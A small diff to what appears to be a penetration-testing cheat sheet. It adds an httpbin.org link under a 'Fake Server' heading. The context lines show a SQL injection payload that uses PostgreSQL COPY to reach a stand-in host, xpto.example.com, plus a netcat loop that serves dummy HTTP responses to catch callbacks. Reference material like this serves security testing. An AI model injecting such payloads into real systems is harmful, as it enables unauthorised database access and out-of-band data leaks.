@@ -383,6 +383,9 @@
 			'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'
 
 ### Fake Server
+	A simple HTTP Request & Response Service.
+		https://httpbin.org/
+		
 	# HTTP
 		while true ; do echo -e "HTTP/1.1 200 OK\nContent-Length: 0\n\n" | nc -vl 1.2.3.4 80; done
     
